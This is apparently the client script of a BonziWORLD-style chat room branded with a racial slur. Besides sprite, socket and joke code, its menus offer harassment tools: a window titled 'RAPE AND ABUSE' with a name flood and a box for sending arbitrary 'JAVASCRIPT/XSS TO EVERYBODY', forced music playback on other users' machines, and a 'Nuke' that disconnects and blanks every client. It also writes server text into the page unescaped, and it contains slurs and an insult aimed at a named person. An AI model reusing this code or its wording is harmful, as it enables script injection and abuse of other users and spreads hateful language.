
var socket = io(location.href);
var usersPublic = {};
var bonzis = {};
var adElement = "#ap_iframe";

$(function() {
  $(window).load(updateAds); 
  $(window).resize(updateAds);
  $('body').on('DOMNodeInserted', adElement, updateAds);
  $('body').on('DOMNodeRemoved', adElement, updateAds);
});


function touchHandler(event){
  var touches = event.changedTouches,first = touches[0],type = "";
  switch(event.type){
    case "touchstart": type = "mousedown"; break;
    case "touchmove":  type = "mousemove"; break;        
    case "touchend":   type = "mouseup";   break;
    default:           return;
  }
  var simulated = document.createEvent("MouseEvent");
  simulated.initMouseEvent(type, true, true, window, 1, first.screenX, first.screenY, first.clientX, first.clientY, false, false, false, false, 0, null);
  first.target.dispatchEvent(simulated);
}

$(window).load(function(){
  $("#login_card").show();
  $("#login_load").hide();

  loadQueue.loadManifest([
    {id: "bonziBlack", src:"./img/bonzi/black.png"},
    {id: "bonziBlue", src:"./img/bonzi/blue.png"},
    {id: "bonziBrown", src:"./img/bonzi/brown.png"},
    {id: "bonziGreen", src:"./img/bonzi/green.png"},
    {id: "bonziPurple", src:"./img/bonzi/purple.png"},
    {id: "bonziRed", src:"./img/bonzi/red.png"},
    {id: "bonziPink", src:"./img/bonzi/pink.png"},
    {id: "bonziSmile", src:"./img/bonzi/smile.png"},
    {id: "bonziBsn", src:"./img/bonzi/bsn.png"},
    {id: "Peedy", src:"./img/bonzi/peedy.png"},
    {id: "topjej", src:"./img/misc/topjej.png"}
  ]);
  loadQueue.on("fileload", function(e) {
    loadDone.push(e.item.id);
  }, this);
  document.addEventListener("touchstart", touchHandler, true);
  document.addEventListener("touchmove", touchHandler, true);
  document.addEventListener("touchend", touchHandler, true);
  document.addEventListener("touchcancel", touchHandler, true);    
});

var go = false;
var current = "";
var left = 0;
var MYUSERNAM = "Anonymous";
var click = false;
var t = 0;
var keypress = false;
var logtxt = "WELCOME TO COONWORLD 999 HD.<br>";
document.onkeydown = () => {
  keypress = true;
}
document.onkeyup = () => {
  setTimeout(() => {keypress = false;},2000);
}
var isOnDiv = false;
var isOnClose = false;
var currentDrag = "";

function Id(length) {
   const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';let result = '';
   for (let i = 0; i < length; i++){
      result += characters.charAt(Math.floor(Math.random() * characters.length));
   }
   return result;
}
function app(type){
  if(type == "flash_playerbg"){
    var playr = "";
    function runGame(swf){
      var flashcontext = document.getElementById("flash_con");
      flashcontext.style.width = "550px";
      flashcontext.style.height = "440px";
      flashcontext.style.visibility = "visible";
      flashcontext.innerHTML = "";
      window.RufflePlayer = window.RufflePlayer || {};
      window.RufflePlayer.config = {
        forcescale: true,
        quality: "low"
      }
      var rufl = "";
      var urle = swf;
        var ruffle = window.RufflePlayer.newest();
        var player = ruffle.createPlayer();
        var container = document.getElementById("flash_con");
        player.style.width = "495px";
        player.style.height = "396px";
        container.appendChild(player);
        player.load(urle);
        rufl = window.RufflePlayer.newest();
        playr = player;
      document.getElementById("flash_x").onclick = () => {
        playr.remove();
        document.getElementById("flash_window").style.visibility = "hidden";
        flashcontext.innerHTML = '<a id="flash_it" href="javascript:var a=1;">Icy Tower</a><br><a id="flash_pb" href="javascript:var a=1;">Papas Burgeria</a><br><input type="text" id="swfurl"><button id="cst">Custom Swf URL</button>';
        flashcontext.style.visibility = "hidden";
      }
    }


    document.getElementById("cst").onclick = () => {
      runGame(document.getElementById("swfurl").value);
    }
    document.getElementById("flash_x").onclick = () => {
      document.getElementById("flash_window").style.visibility = "hidden";
      document.getElementById("flash_con").style.visibility = "hidden";
    }
    document.getElementById("flash_player").onclick = () => {
      document.getElementById("flash_window").style.visibility = "visible";
      document.getElementById("flash_con").style.visibility = "visible";
    }
    document.getElementById("flash_it").onclick = () => {
      runGame("icytower.swf");
    }
    document.getElementById("flash_pb").onclick = () => {
      runGame("papasburgeria.swf");
    }
  }

  if(type == "bsn"){
    newWindow("bsn","BSN Messenger","<div id='bsn_cont'></div>","<hr>","80%","80%");
    $("#bsn_cont").innerHTML = "<iframe src='/bsn.html'"
  }
}
function notif(head, body, top, left, type){
  let localId = Id(10);
  console.log("bla")
  $("#content").append("<div class='notif' id='"+localId+"' style='top:"+top+";left:"+left+";'><div class='notif_cont'><h3 class='notif_header'>"+head+"</h3><div class='body'>"+body+"</div></div></div>");
  document.body.onresize = () => {
    var infox = document.getElementById("info_icon").getBoundingClientRect().x - 330 + "px";
    var infoy = $(window).height() - 140 + "px";
    //var infox = info + "px";
    //var infoy = info2 + "px";
    if(type == "info")
    $("#"+localId).css({
       "top": infoy,
       "left": infox
    });
  }
  setTimeout(() => { $("#"+localId).remove(); },6000)
}
function newWindow(type, header, body, buttons, top, left){
  var localId = Id(5);
  var previous = 0;
  var current = 0;

  currentDrag = localId;

  $("#content").append('<div id='+localId+' class="window" style="position: absolute;top: '+top+'; left: '+ left+';"><div style="height:14%;width:85%;" id="'+localId+'_bar"><img id="'+localId+'_x" class="x" src="/img/desktop/x.png"></div><div id="'+localId+'_con" style="position:relative;left: 2%;"><h3 class="header">'+header+'</h3><br>'+body+'</div></div>');

  $("#" + localId + "_con").css({'font-family': 'WinXP'});

  $("#" + localId + "_bar").on("mousedown", () => {
    
  })
  if(buttons == "ok"){
    $("#" + localId).append('<div style="position:relative;top: 29%;left:2%;"><button id="'+localId+'_ok">Ok</button>');
  }
  if(buttons == "ok_cancel"){
    $("#" + localId).append('<div style="position:relative; top: 29%; left:2%; display:flex;"><button id="'+localId+'_ok">Ok</button><button id="'+localId+'_cancel">Cancel</button></div>');
  }
  if(buttons.includes('<')){
    $("#" + localId).append(buttons);
  }
  document.getElementById(localId).style.position = "absolute";
  $("#" + localId + "_x").on("mousedown", function(){
    $("#" + localId).remove();
  });
  $("#" + localId + "_ok").on("mousedown", function(){
    if(type == "options"){
    socket.emit("command",{list: ["color",$("#color").val()]});
    socket.emit("command",{list: ["name",$("#newname").val()]}); 
    }
    $("#" + localId).remove();
  });
  $("#" + localId + "_cancel").on("mousedown", function(){
    $("#" + localId).remove();
  });
  document.addEventListener('mousemove', (e) => {
    left = e.clientX;
    t = e.clientY;
  });
}
function loadTest() {
    $("#login_card").hide();
    $("#login_error").hide();
    $("#login_load").show();

    // Clear any existing intervals
    if (window.loadTestInterval) {
        window.loadTestInterval.clear();
    }

    window.loadTestInterval = rInterval(() => {
        try {
            socket.emit("login", {
                name: $("#login_name").val(),
                room: $("#login_room").val()
            });
            setup();
            window.loadTestInterval.clear();
        } catch (e) {
            console.error("Login failed:", e);
            showError("Connection error. Please try again.");
        }
    }, 1000); // Adjusted interval to 1 second
}
function insertNuke(x,y,color){
    let localId = Id(5);
    document.body.insertAdjacentHTML('beforeend',`
    <div style="width:200px;height:200px;overflow:hidden;position:absolute;left:${x}px;top:${y}px;" id="${localId}">
        <img src="https://files.catbox.moe/oxmn7y.gif" width="200" height="auto">
        <div style="overflow:hidden;width:200px;height:160px;position:relative;top:-200px;">
            <img src="${color}" width="3300" height="auto">
        </div>
    </div>
    `);
    setTimeout(() => {document.getElementById(localId).remove();},1000);
}
function showError(message) {
    $("#login_card").show();
    $("#login_load").hide();
    $("#login_error").show().text(message);
}
var first = true;
$(function() {
    
    $("#login_card").html('<input id="login_name" type="text" placeholder="Nickname"><input id="login_room" type="text" placeholder="Room ID (Optional)"><div id="login_go"></div><div id="login_error" style="display:none"></div>');
    $("#login_go").click(() => {loadTest(); if(first == true){
      setTimeout(() => {
        var audioe = new Audio("/sound/start.mp3");
        audioe.play();
        first = false;
      },300);
      }});

  $("#login_room").val(window.location.hash.slice(1));

  $("#login_name, #login_room").keypress(function(e) {
    if(e.which == 13) {
      socket.emit("login", {
        name: $("#login_name").val(),
        room: $("#login_room").val()
      });
      MYUSERNAM = $("#login_name").val();
      setup();
    }
  });

  socket.on("ban", function(data) {
    $("#page_ban").show();
    $("#ban_reason").html(data.reason);
    $("#ban_end").html(new Date(data.end).toString());
  });

  socket.on("kick", function(data) {
    $("#page_kick").show();
    $("#kick_reason").html(data.reason);
  });

  socket.on("loginFail", function(data) {
    var errorText = {"nameLength": "Name too long.","full": "Room is full.","nameMal": "Nice try. Why would anyone join a room named that anyway?",};
    $("#login_card").show();
    $("#login_load").hide();
    $("#login_error").show().text( "Error: " +errorText[data.reason] +" (" + data.reason + ")");
  });

  socket.on("disconnect", function(data) {
    if (($("#page_ban").css("display") == "none") || ($("#page_kick").css("display") == "none")) {
      newWindow("error","ERROR","<img src='./img/error/logo.png' width='50' height='50'><br>SOMETHING IS BROKEN YOU ARE NOW DISCONNECTED FIX YOUR INTERNET OR EXPERIENCE AN UNDISCOVERED STD FROM SEAMUS DAMIEN KENDRICK R. CREMEENS <a href='#' onclick='window.location.reload()'>RELOAD</a><br>","ok","40%","40%");
    }
  });
});
var cfocus = false;
function advertisement(src){
    let localId = Id(5);
    let movesX = ["0px","30%","20%","10%","15%","25%"];
    let movesY = ["0px","100px","40%",]
    let ran = (a) => {return a[Math.floor(Math.random() * a.length)];}
    document.body.insertAdjacentHTML('beforeend',`
        <div id="${localId}" class="advert" onclick="this.remove();" style="position:absolute;left:${ran(movesX)};top:${ran(movesY)};z-index:9999;background-image:url(./img/ads/ad.png);background-size:100%;width:250px;height:220px;">
        <img src="${src}" style="margin-top:70px;margin-left:10px;user-select:none;background-color:black;" width="215" height="140">
        </div>
    `);
}
function Nuke(){
    let audero = new Audio('./sound/nuke.mp3');
    audero.play();

    setTimeout(() => {
        socket.disconnect();
        document.body.insertAdjacentHTML('beforeend',`
            <style>
            @keyframes incoming {
            from{filter:brightness(1);}
            to{filter:brightness(10);}
            }
            @keyframes fadeing {
            from{opacity:0;}
            to{opacity:1;}
            }
            @keyframes fadeingout{
            from{opacity:1;}
            to{opacity:0;}
            }
            #content {
                animation: incoming 1.5s linear;
                animation-fill-mode:forwards; 
            }
            .advert {
              display:none;
            }
              #trailr {display:none;}
            #nuclearbomb {
                width:100%; height:100%;
                animation: fadeing 3.5s linear;
                animation-fill-mode:forwards; 
            }
            </style>
            <img src="./img/nuke.png" id="nuclearbomb">
        `);
        setTimeout(() => {
            document.getElementById('content').remove();
            document.getElementById('nuclearbomb').style.animation = "fadeingout 5s linear";
            document.body.style.backgroundColor='black';document.body.style.backgroundImage='none';document.body.style.color='white';
            setTimeout(() => {document.body.innerHTML = "DESTROYED BY NUCLEAR WARHEAD."; },5000);
        },5000);
    },3500);
    
}
let minutes = 3;
let getAd = () => {
  let c = Math.random();
  let adlist = [
    './img/ads/ad_jabbtool.gif',
    './img/ads/ad_bonzi.gif',
    './img/ads/brapworld.png',
    './img/ads/tucows.png',
    './img/ads/AE.png',
    './img/ads/seasheit.png',
    './img/ads/xpweed.png',
  ];
  advertisement(adlist[Math.floor(Math.random() * adlist.length)]);
}
setInterval(getAd,(minutes*60)*1000);
class agenthandle {
  constructor() {
    this.framerate = 1.0 / 15.0;
    this.spriteSheetCache = {};  // Cache for loaded sprite sheets
    this.spriteSheets = {};       // Store for active sprite sheets
    this.initializeStage();
    this.registerEventListeners();
    this.startTickLoop();
  }

  initializeStage() {
    this.stage = new createjs.StageGL($("#bonzi_canvas")[0], { "transparent": true });
    this.stage.autoClear = true;
    this.stage.tickOnUpdate = false;
    this.resizeCanvas();
  }

  registerEventListeners() {
    $(window).resize(this.resizeCanvas.bind(this));
  }

  startTickLoop() {
    this.intervalTick = setInterval(() => {
      for (const key in bonzis) {
        bonzis[key].update();
      }
      this.stage.tick();
    }, this.framerate * 1000);

    this.intervalMain = setInterval(() => {
      if (this.needsUpdate) {
        this.stage.update();
        this.needsUpdate = false;
      }
    }, 1000.0 / 60.0);
  }

  resizeCanvas() {
    const width = this.stage.canvas.width = $(window).width();
    const height = this.stage.canvas.height = $(window).height();
    this.stage.updateViewport(width, height);
    this.needsUpdate = true;
    for (const key in bonzis) {
      bonzis[key].move();
    }
  }

  async loadSpriteSheet(color) {
  if (!color) color = "/img/bonzi/purple.png"; // Default fallback
  
  if (!this.spriteSheets[color] && !this.spriteSheetCache[color]) {
    try {
      // If it's an external URL
      if (color.startsWith('http://') || color.startsWith('https://')) {
        return new Promise((resolve) => {
          const img = new Image();
          img.crossOrigin = "Anonymous";
          img.onload = () => {
            const spriteData = {
              images: [img],
              frames: BonziData.sprite.frames,
              animations: BonziData.sprite.animations
            };
            this.spriteSheets[color] = new createjs.SpriteSheet(spriteData);
            this.spriteSheetCache[color] = true;
            this.needsUpdate = true;
            resolve(this.spriteSheets[color]);
          };
          img.onerror = () => {
            console.error('Failed to load external image:', color);
            // Fallback to default color
            resolve(this.loadSpriteSheet("/img/bonzi/purple.png"));
          };
          img.src = color;
        });
      } else {
        // Handle regular color loading
        const spriteData = {
          images: [color],
          frames: BonziData.sprite.frames,
          animations: BonziData.sprite.animations
        };
        this.spriteSheets[color] = new createjs.SpriteSheet(spriteData);
        this.spriteSheetCache[color] = true;
        return this.spriteSheets[color];
      }
    } catch (error) {
      console.error('Failed to load sprite sheet:', error);
      // Fallback to default color
      return this.loadSpriteSheet("/img/bonzi/purple.png");
    }
  }
  return this.spriteSheets[color];
}

 async handleColorUpdate(bonziInstance) {
  const color = bonziInstance.userPublic.color;
  const spriteSheet = await this.loadSpriteSheet(color);
  
  if (spriteSheet) {
    this.stage.removeChild(bonziInstance.sprite);
    bonziInstance.sprite = new createjs.Sprite(spriteSheet, "idle");
    this.stage.addChild(bonziInstance.sprite);
    bonziInstance.move();
    this.needsUpdate = true;
  }
}
async initializeSpriteSheets() {
    // List of all colors that should be preloaded
    const colorsToLoad = [
        "/img/bonzi/black.png",
        "/img/bonzi/blue.png",
        "/img/bonzi/brown.png",
        "/img/bonzi/green.png",
        "/img/bonzi/purple.png",
        "/img/bonzi/red.png",
        "/img/bonzi/pink.png",
        "/img/bonzi/smile.png",
        "/img/bonzi/bsn.png",
        "/img/bonzi/peedy.png"
    ];

    // Load each SpriteSheet
    for (const color of colorsToLoad) {
        if (!this.spriteSheets[color] && !this.spriteSheetCache[color]) {
            await this.loadSpriteSheet(color);
        }
    }
  }
 bonzisCheck() {
  for (const key in usersPublic) {
    if (!bonzis[key]) {
      // Ensure sprite sheet is loaded before creating Bonzi
      this.loadSpriteSheet(usersPublic[key].color).then(() => {
        bonzis[key] = new Bonzi(key, usersPublic[key]);
      }).catch(() => {
        // Fallback to default if loading fails
        bonzis[key] = new Bonzi(key, {
          ...usersPublic[key],
          color: "/img/bonzi/purple.png"
        });
      });
    } else {
      const bonziInstance = bonzis[key];
      bonziInstance.userPublic = usersPublic[key];
      bonziInstance.updateName();
      
      if (bonziInstance.color !== usersPublic[key].color) {
        bonziInstance.color = usersPublic[key].color;
        this.handleColorUpdate(bonziInstance);
      }
    }
  }
}
}
function setup() {
  window.BonziHandler.initializeSpriteSheets();
  getAd();
  var clickhandlers = [
    {id: "#my_bonzi", func: () => {
      newWindow('options','RAPE AND ABUSE','MENU FOR RAPEING AND ABUSEING.<br><div style="display:flex;" bis_skin_checked="1"><input type="text" placeholder="FLOOD NAME" id="newname"></div><br><div style="display:flex;flex-direction:row;" bis_skin_checked="1"><button onclick="hax.flood()">FLOOD</button></div><hr><textarea placeholder="CUSTOM JAVASCRIPT HERE..." width="200" height="200" id="jscont"></textarea><br><button onclick="hax.send(document.getElementById(`jscont`).value)">SEND JAVASCRIPT/XSS TO EVERYBODY</button>','ok_cancel','40%','40%'); 
    }},
    {id: "#bonzi_log", func: () => {
      newWindow('bw','Bonzi Log','<div id="log_cont">'+logtxt+'</div>','ok','0%','0%');
    }},
    {id: "#loudassmusic",func: () => {
      newWindow('options','BLAST MUSIC','PISS OFF EVERYBODY IN THE ROOM BY USING THIS EPIK TOOL TO PLAY MUSIC ON OTHER PEOPLES PCS <hr> <input type="text" id="musicname" placeholder="MUSIC URL"><button onclick="hax.blastMusic(document.getElementById(`musicname`).value);">BLAST MUSIC</button>','ok','0%','0%');
    }},
    {id: "#info_icon", func: () => {
      var icon = document.getElementById("info_icon").getBoundingClientRect().x - 310;
      var icon2 = $(window).height() - 140;
      var iconx = icon + "px";
      var icony = icon2 + "px";
      new notif("COONWORLD","COONWORLD HD PLUS DELUXE NO RULES YOU CAN SEND XSS/JAVASCRIPT LIKE THIS: &lt;script&gt;JAVASCRIPT HERE&lt;/script&gt;", icony, iconx,"info");
    }},
    {id: "#games", func: () => {
      newWindow("games","BonziWORLD Games","<div style='width:300px;height:120px;overflow:scroll'><img src='/img/desktop/flash.png' id='flash_player' width='40' height='40'>Flash Player</img><br><img src='/img/desktop/flash.png' id='flash_player' width='40' height='40'>Flash Player</img></div>","ok");
      new app("flash_playerbg");
    }},
    {id: "#bsn_messenger", func: () => {
      hax.blastMusic('./sound/alert.mp3');
    }},
    {id: "#chat_send", func: sendInput},
    {id:"#nukeroom",func: () => {/*
      let question = prompt('ARE YOU SURE YOU WANT TO DO THIS');
      let confirms = ["yes","yeah","yep","uh huh","affirmative","true","ok","okay","i want to","i do","im sure"]
      if(typeof question == 'string'){
        if(confirms.some(r => question.toLowerCase().includes(r)))hax.send('Nuke();');
      }*/
     hax.send('Nuke();');
    }}
  ];
  for(i = 0; i < clickhandlers.length; i++){
    $(clickhandlers[i].id).click(clickhandlers[i].func);
  }

  $("#chat_message").keypress(function(e) {
    if(e.which == 13) sendInput();
  });

  socket.on("room", function(data) {
    $("#room_public").hide();
    $("#room_private").hide();
    $("#room_owner").hide();
    if(data.isPublic){
      $("#room_public").show();
      $(".room_id").text("default");
    } else {
      $("#room_private").show();
      $(".room_id").text(data.room);
    }
    if(data.isOwner){
      $("#room_owner").show();
    }
  });
  socket.on("updateAll", function(data) {
    $("#page_login").hide();
    usersPublic = data.usersPublic;
    usersUpdate();
    BonziHandler.bonzisCheck();
  });
  socket.on("update", function(data) {
    window.usersPublic[data.guid] = data.userPublic;
    usersUpdate();
    BonziHandler.bonzisCheck();
  });
  socket.on("newcolors");

  socket.on("image",d=>{
    let b = bonzis[d.guid];
    b.runSingleEvent([
      {type:"html",text:"- <img src='"+d.image+"' width='200' height='auto'>"}
    ]);
  });
  
  socket.on("msg", function(data) {
    var b = bonzis[data.guid];
    b.cancel();
    b.runSingleEvent([{
      type: "text",
      text: data.text
    }]);
    logtxt +="<br>"+ b.userPublic.name + ": " + data.text + "<br>";
    if(document.getElementById("log_cont")){
    document.getElementById("log_cont").innerHTML = logtxt;}
  });
  socket.on("youtube", function(data) {
    var b = bonzis[data.guid];
    b.cancel();
    b.youtube(data.vid);
  });
  socket.on("fact", function(data) {
    var b = bonzis[data.guid];
    b.rng = new Math.seedrandom(data.rng);
    b.cancel();
    b.fact();
  });
  socket.on("joke", function(data) {
    var b = bonzis[data.guid];
    b.rng = new Math.seedrandom(data.rng);
    b.cancel();
    b.joke();
  });

  socket.on("godmodeobtained", function(data) {
    newWindow("bw",'Godmode Activated','You have been granted godmode! <img src="/img/ban/logo.png"></img>','ok',"40%","40%");
  });

  socket.on("backflip", function(data) {
    var b = bonzis[data.guid];
    b.cancel();
    b.backflip(data.swag);
  });

  socket.on("clap", function(data) {
    var b = bonzis[data.guid];
    b.cancel();
    b.clap();
  });

  socket.on("asshole", function(data) {
    var b = bonzis[data.guid];
    b.cancel();
    b.asshole(data.target);
  });

  document.getElementById('chat_message').addEventListener('focus', function(){
    var canSend = true;
    if(keypress == true){
      if(canSend == true){
        socket.emit("command",{list: ["typing"]});}
      canSend = false;
    } else {
      canSend = true;
    }
  });

  socket.on("owo", function(data) {
    var b = bonzis[data.guid];
    b.cancel();
    b.owo(data.target);
  });

  socket.on("triggered", function(data) {
    var b = bonzis[data.guid];
    b.cancel();
    b.runSingleEvent(b.data.event_list_triggered);
  });

  socket.on("linux", function(data) {
    var b = bonzis[data.guid];
    b.cancel();
    b.runSingleEvent(b.data.event_list_linux);
  });

  socket.on("pawn", function(data) {
    var b = bonzis[data.guid];
    b.cancel();
    b.runSingleEvent(b.data.event_list_pawn);
  });

  socket.on("vaporwave", function(data) {
    $("body").addClass("vaporwave");
  });

  socket.on("unvaporwave", function(data) {
    $("body").removeClass("vaporwave");
  });


  socket.on("nuke",data => {
    var b = bonzis[data.guid];
    if (typeof b != "undefined") {
      insertNuke(b.x,b.y,b.userPublic.color);
      b.exit((function(data) {
        this.deconstruct();
        delete bonzis[data.guid];
        delete usersPublic[data.guid];
        usersUpdate();
      }).bind(b, data),true);
    }
  });


  /////

  socket.on("leave", function(data) {
    var b = bonzis[data.guid];
    if (typeof b != "undefined") {
      b.exit((function(data) {
        this.deconstruct();
        delete bonzis[data.guid];
        delete usersPublic[data.guid];
        usersUpdate();
      }).bind(b, data));
    }
  });
}
var usersAmt = 0;
var usersKeys = [];
function usersUpdate() {
  usersKeys = Object.keys(usersPublic);
  usersAmt = usersKeys.length;
  $("#users_online").html("Users online: "+usersAmt);
}
function sendInput() {
  var text = $("#chat_message").val();
  $("#chat_message").val("");
  if (text.length > 0) {
    var youtube = youtubeParser(text);
    if (youtube) {
      socket.emit("command", {
        list: ["youtube", youtube]
      });
      return;
    }

    if (text.substring(1,0) == "/") {
      var list = text.substring(1).split(" ");
      if(typeof list == "object" && list.length !== undefined){
        if(list.length > 1 && list[0] == "image"){
          socket.emit("image",list[1]);
        } else {
          socket.emit("command", {
            list: list
          });
        }
      } 
    } else {
      socket.emit("msg", {text: text})
    }
  }
}
function loadBonzis(callback) {
  loadQueue.loadManifest([
    {id: "bonziBlack", src:"./img/bonzi/black.png"},
    {id: "bonziBlue", src:"./img/bonzi/blue.png"},
    {id: "bonziBrown", src:"./img/bonzi/brown.png"},
    {id: "bonziGreen", src:"./img/bonzi/green.png"},
    {id: "bonziPurple", src:"./img/bonzi/purple.png"},
    {id: "bonziRed", src:"./img/bonzi/red.png"},
    {id: "bonziPink", src:"./img/bonzi/pink.png"},
    {id: "bonziSmile", src:"./img/bonzi/smile.png"},
    {id: "bonziBsn", src:"./img/bonzi/bsn.png"},
    {id: "Peedy", src:"./img/bonzi/peedy.png"},
    {id: "topjej", src:"./img/misc/topjej.png"}
  ]);
  loadQueue.on("fileload", function(e) {
    loadDone.push(e.item.id);
  }, this);
  if (callback)
    loadQueue.on("complete", callback, this);
}
function updateAds() {
  var height = $(window).height() -
    $(adElement).height();
  var hideAd = height <= 250;
  if (hideAd) height = $(window).height();
  $(adElement)[hideAd ? "hide" : "show"]();
  $("#content").height(height);
}
function range(begin, end) {
  var array = [];
  for (var i = begin; i <= end; i++)
    array.push(i);
  for (var i = begin; i >= end; i--)
    array.push(i);
  return array;
}

function youtubeParser(url){
  var regExp = /^.*((youtu.be\/)|(v\/)|(\/u\/\w\/)|(embed\/)|(watch\?))\??v?=?([^#\&\?]*).*/;
  var match = url.match(regExp);
  return (match&&match[7].length==11)? match[7] : false;
}
function rtimeOut(callback,delay){
 var dateNow=Date.now,
     requestAnimation=window.requestAnimationFrame,
     start=dateNow(),
     stop,
     timeoutFunc=function(){
      dateNow()-start<delay?stop||requestAnimation(timeoutFunc):callback();
     };
 requestAnimation(timeoutFunc);
 return{
  clear:function(){stop=1}
 };
}
function rInterval(callback,delay){
 var dateNow=Date.now,
     requestAnimation=window.requestAnimationFrame,
     start=dateNow(),
     stop,
     intervalFunc=function(){
      dateNow()-start<delay||(start+=delay,callback());
      stop||requestAnimation(intervalFunc);
     };
 requestAnimation(intervalFunc);
 return{
  clear:function(){stop=1}
 };
}
if(Array.prototype.equals){
    console.warn("Overriding existing Array.prototype.equals. Possible causes: New API defines the method, there's a framework conflict or you've got double inclusions in your code.");}
Array.prototype.equals = function (array) {
    if (!array)
        return false;

    if (this.length != array.length)
        return false;

    for (var i = 0, l=this.length; i < l; i++) {
        if (this[i] instanceof Array && array[i] instanceof Array) {
            if (!this[i].equals(array[i]))
                return false;       
        }           
        else if (this[i] != array[i]) { 
            return false;   
        }           
    }       
    return true;
};
Object.defineProperty(Array.prototype, "equals", {enumerable: false});
function linkify(text) {
    var regex = /(https?:\/\/([-\w\.]+)+(:\d+)?(\/([\w\/_\.]*(\?\S+)?)?)?)/ig
    let final = text.replace(regex, "<a href='$1' target='_blank'>$1</a>");
    if(text.includes("<img src='https://"))final = text;
    return final;
}

var loadQueue = new createjs.LoadQueue();
var loadDone = [];


var BonziData = {
  size: {
    x: 200,
    y: 160
  },
  sprite: {
    frames: {width: 200, height: 160},
    animations: {
      idle: 0,

      surf_across_fwd: [1, 8, "surf_across_still", 1],
      surf_across_still: 9,
      surf_across_back: {
        frames: range(8,1),
        next: "idle",
        speed: 1
      },

      clap_fwd: [10, 12, "clap_still", 1],
      clap_still: [13, 15, "clap_still", 1],
      clap_back: {
        frames: range(12,10),
        next: "idle",
        speed: 1
      },

      surf_intro: [277, 302, "idle", 1],
      surf_away: [16, 38, "gone", 1],

      gone: 39,

      shrug_fwd: [40, 50, "shrug_still", 1],
      shrug_still: 50,
      shrug_back: {
        frames: range(50,40),
        next: "idle",
        speed: 1
      },

      earth_fwd: [51, 57, "earth_still", 1],
      earth_still: [58, 80, "earth_still", 1],
      earth_back: [81, 86, "idle", 1],

      // TODO: ADD BLINK
      look_down_fwd: [87, 90, "look_down_still", 1],
      look_down_still: 91,
      look_down_back: {
        frames: range(90, 87),
        next: "idle",
        speed: 1
      },

      // TODO: ADD BLINK
      lean_left_fwd: [94, 97, "lean_left_still", 1],
      lean_left_still: 98,
      lean_left_back: {
        frames: range(97, 94),
        next: "idle",
        speed: 1
      },

      beat_fwd: [101, 103, "beat_still", 1],
      beat_still: [104, 107, "beat_still", 1],
      beat_back: {
        frames: range(103, 101),
        next: "idle",
        speed: 1
      },

      cool_fwd: [108, 124, "cool_still", 1],
      cool_still: 125,
      cool_back: {
        frames: range(124, 108),
        next: "idle",
        speed: 1
      },

      cool_right_fwd: [126, 128, "cool_right_still", 1],
      cool_right_still: 129,
      cool_right_back: {
        frames: range(128, 126),
        next: "idle",
        speed: 1
      },

      cool_left_fwd: [131, 133, "cool_left_still", 1],
      cool_left_still: 134,
      cool_left_back: {
        frames: range(133, 131),
        next: "cool_still",
        speed: 1
      },

      cool_adjust: {
        frames: [124, 123, 122, 121, 120, 135, 136, 135, 120, 121, 122, 123, 124],
        next: "cool_still",
        speed: 1
      },

      present_fwd: [137, 141, "present_still", 1],
      present_still: 142,
      present_back: {
        frames: range(141, 137),
        next: "idle",
        speed: 1
      },

      look_left_fwd: [143, 145, "look_left_still", 1],
      look_left_still: 146,
      look_left_back: {frames: range(145, 143),next: "idle",speed: 1},
      look_right_fwd: [149, 151, "look_right_still", 1],
      look_right_still: 152,
      look_right_back: {frames: range(151, 149),next: "idle",speed: 1},
      lean_right_fwd: { frames: range(158, 156), next: "lean_right_still", speed: 1} ,
      lean_right_still: 155, 
      lean_right_back: [156, 158, "idle", 1],
      praise_fwd: [159, 163, "praise_still", 1], 
      praise_still: 164, 
      praise_back: { frames: range(163, 159), next: "idle", speed: 1 },
      grin_fwd: [182, 189, "grin_still", 1], 
      grin_still: 184, 
      grin_back: { frames: range(184, 182), next: "idle", speed: 1},

      backflip: [331, 343, "idle", 1]
    }
  },
  to_idle: {
    surf_across_fwd: "surf_across_back",
    surf_across_still: "surf_across_back",

    clap_fwd: "clap_back",
    clap_still: "clap_back",

    shrug_fwd: "shrug_back",
    shrug_still: "shrug_back",

    earth_fwd: "earth_back",
    earth_still: "earth_back",

    look_down_fwd: "look_down_back",
    look_down_still: "look_down_back",

    lean_left_fwd: "lean_left_back",
    lean_left_still: "lean_left_back",

    beat_fwd: "beat_back",
    beat_still: "beat_back",

    cool_fwd: "cool_back",
    cool_still: "cool_back",
    cool_adjust: "cool_back",

    cool_left_fwd: "cool_left_back",
    cool_left_still: "cool_left_back",

    present_fwd: "present_back",
    present_still: "present_back",

    look_left_fwd: "look_left_back",
    look_left_still: "look_left_back",

    look_right_fwd: "look_right_back",
    look_right_still: "look_right_back",

    lean_right_fwd: "lean_right_back",
    lean_right_still: "lean_right_back",

    praise_fwd: "praise_back",
    praise_still: "praise_back",

    grin_fwd: "grin_back",
    grin_still: "grin_back",

    backflip: "idle",

    idle: "idle",
  },
  pass_idle: [
    "gone"
  ],
  event_list_joke_open: [
    [
      { type: "text",text: "Yeah, of course {NAME} wants me to tell a joke."},
      {type: "anim",anim: "praise_fwd",ticks: 15},
      {type: "text",text: '"Haha, look at the stupid {COLOR} monkey telling jokes!" Fuck you. It isn\'t funny.',say: "Hah hah! Look at the stupid {COLOR} monkey telling jokes! Fuck you. It isn't funny."},
      { type: "anim",anim: "praise_back",ticks: 15},
      {type: "text",text: "But I'll do it anyway. Because you want me to. I hope you're happy."
      }
    ],
    [{type: "text",text: "{NAME} used /joke. Whoop-dee-fucking doo."}],
    [{type: "text",text: "HEY YOU IDIOTS ITS TIME FOR A JOKE"}],
    [
      {
        type: "text",
        text: "Wanna hear a joke?"
      },
      {
        type: "text",
        text: "No?"
      },
      {
        type: "text",
        text: "Mute me then. That's your fucking problem."
      }
    ],[
      {
        type: "text",
        text: "Senpai {NAME} wants me to tell a joke."
      }
    ],[
      {
        type: "text",
        text: "Time for whatever horrible fucking jokes the creator of this site wrote."
      }
    ]
  ],
  event_list_joke_mid: [
    [
      {
        type: "text",
        text: "What is easy to get into, but hard to get out of?"
      },
      {
        type: "text",
        text: "Child support!"
      }
    ],[
      {
        type: "text",
        text: "Why do they call HTML HyperText?"
      },
      {
        type: "text",
        text: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      },
      {
        type: "anim",
        anim: "shrug_back",
        ticks: 15
      },
      {
        type: "text",
        text: "Sorry. I just had an epiphany of my own sad, sad existence."
      }
    ],[
      {
        type: "text",
        text: "Two sausages are in a pan. One looks at the other and says \"Boy it's hot in here!\" and the other sausage says \"Unbelievable! It's a talking sausage!\"",
